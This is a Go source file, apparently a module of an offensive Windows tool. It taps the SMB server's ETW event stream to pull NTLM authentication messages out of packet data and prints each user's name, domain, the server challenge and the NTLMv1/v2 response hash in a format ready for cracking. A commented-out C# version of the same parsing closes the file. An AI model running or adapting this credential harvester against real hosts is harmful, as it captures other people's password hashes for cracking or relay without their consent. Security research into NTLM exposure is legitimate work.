package modules

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"unicode/utf16"

	"github.com/0xrawsec/golang-etw/etw"
	"github.com/lkarlslund/binstruct"
)

type NTLMHash struct {
	lastServerChallenge []byte
}

func (m *NTLMHash) Init() (etw.Provider, error) {
	provider, err := etw.ParseProvider("Microsoft-Windows-SMBServer")
	if err != nil {
		return provider, err
	}
	provider.Filter = []uint16{40000}
	return provider, nil
}

func (m *NTLMHash) ProcessEvent(e *etw.Event) {
	pds, found := e.GetPropertyString("PacketData")
	if !found {
		return
	}

	pd, err := hex.DecodeString(pds[2:])
	if err != nil {
		return
	}

	for {
		offset := bytes.Index(pd, []byte{0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00})
		if offset == -1 {
			// Does not have NTLM message header
			return
		}

		// This is the start of the raw NTLM message
		var header NTLMMessageHeader
		err := binstruct.UnmarshalLE(pd[offset:], &header)
		if err != nil {
			return
		}

		rawmessage := pd[offset:]

		switch header.MessageType {
		case 1:
		case 2:
			var message NTLMMessage2
			err := binstruct.UnmarshalLE(rawmessage, &message)
			if err == nil {
				m.lastServerChallenge = message.Challenge
			} else {
				fmt.Println(err)
			}
		case 3:
			var message NTLMMessage3
			err := binstruct.UnmarshalLE(rawmessage, &message)
			if err == nil && m.lastServerChallenge != nil {
				if message.NTLMHash.Length == 24 {
					fmt.Printf("%s::%s:%X:%X\n",
						message.UserName.UTF16String(),
						message.WorkStationName.UTF16String(),
						m.lastServerChallenge,
						message.NTLMHash.Data)
				} else if message.NTLMHash.Length > 24 {
					fmt.Printf("%s::%s:%X:%X:%X\n",
						message.UserName.UTF16String(),
						message.TargetName.UTF16String(),
						m.lastServerChallenge,
						message.NTLMHash.Data[:16],
						message.NTLMHash.Data[16:])
				} else {
					fmt.Printf("Short NTLM hash encountered: %s:%s:%s:%X:%X:%X\n",
						message.UserName.UTF16String(),
						message.WorkStationName.UTF16String(),
						message.TargetName.UTF16String(),
						m.lastServerChallenge,
						message.NTLMHash.Data,
						message.LMHash.Data,
					)
				}
				m.lastServerChallenge = nil
			} else {
				fmt.Println(err)
			}
		}

		// Cut header, and see if there's more
		pd = pd[offset+8:]
	}
}

type NTLMMessageHeader struct {
	Header      []byte `bin:"len:8"`
	MessageType uint32
}

type NTLMMessage2 struct {
	NTLMMessageHeader
	Target    OffsetData
	Flags     uint32
	Challenge []byte `bin:"len:8"`
	// Context []byte `bin:"len:8"`
	// TargetInformation []byte `bin:"len:8"`
	// OSVersion []byte `bin:"len:8"`
}

type NTLMMessage3 struct {
	NTLMMessageHeader
	LMHash          OffsetData
	NTLMHash        OffsetData
	TargetName      OffsetData
	UserName        OffsetData
	WorkStationName OffsetData
	SessionKey      OffsetData
	Flags           uint32
	OSVersion       []byte `bin:"len:8"`
}

type OffsetData struct {
	Length uint16
	Space  uint16
	Offset uint32
	Data   []byte `bin:"len:Length,offsetStart:Offset,offsetRestore:true"`
}

func (o OffsetData) String() string {
	return string(o.Data)
}

func (o OffsetData) UTF16String() string {
	data := make([]uint16, len(o.Data)/2)

	r := binstruct.NewReaderFromBytes(o.Data, binary.LittleEndian, false)

	for i := 0; i < len(o.Data)/2; i++ {
		u, _ := r.ReadUint16()

		data[i] = u
	}

	return string(utf16.Decode(data))
}

/*
func (m NTLMHash) decodeMessageType3(ntlm, challenge []byte) {
	var data ntlmpacket
	decoder := binstruct.NewReaderFromBytes(ntlm)
	decoder.Decode(&data)

            var LMHash_offset = BitConverter.ToInt16(NTLM, 16);
            var LMHash = NTLM.Skip(LMHash_offset).Take(LMHash_len).ToArray();


			var NTHash_len = BitConverter.ToInt16(NTLM, 20);
            var NTHash_offset = BitConverter.ToInt16(NTLM, 24);
            var NTHash = NTLM.Skip(NTHash_offset).Take(NTHash_len).ToArray();
            var User_len = BitConverter.ToInt16(NTLM, 36);
            var User_offset = BitConverter.ToInt16(NTLM, 40);
            var User = NTLM.Skip(User_offset).Take(User_len).ToArray();
            var UserString = Encoding.Unicode.GetString(User);

            if (NTHash_len == 24)
            {  // NTLMv1
                var HostName_len = BitConverter.ToInt16(NTLM, 46);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset).Take(HostName_len).ToArray();
                var HostNameString = Encoding.Unicode.GetString(HostName);
                var retval = UserString + "::" + HostNameString + ":" + LMHash + ":" + NTHash + ":" + ByteArrayToString(server_challenge);
                return retval;
            }

            if (NTHash_len > 24)
            { // NTLMv2
                NTHash_len = 64;
                var Domain_len = BitConverter.ToInt16(NTLM, 28);
                var Domain_offset = BitConverter.ToInt16(NTLM, 32);
                var Domain = NTLM.Skip(Domain_offset).Take(Domain_len).ToArray();
                var DomainString = Encoding.Unicode.GetString(Domain);
                var HostName_len = BitConverter.ToInt16(NTLM, 44);
                var HostName_offset = BitConverter.ToInt16(NTLM, 48);
                var HostName = NTLM.Skip(HostName_offset).Take(HostName_len).ToArray();
                var HostNameString = Encoding.Unicode.GetString(HostName);

                var NTHash_part1 = BitConverter.ToString(NTHash.Take(16).ToArray()).Replace("-", "");
                var NTHash_part2 = BitConverter.ToString(NTHash.Skip(16).Take(NTLM.Length).ToArray()).Replace("-", "");
                var retval = UserString + "::" + DomainString + ":" + ByteArrayToString(server_challenge) + ":" + NTHash_part1 + ":" + NTHash_part2;
                return retval;
            }

            Console.WriteLine("Could not parse NTLM hash");
            return "";
        }
}

*/
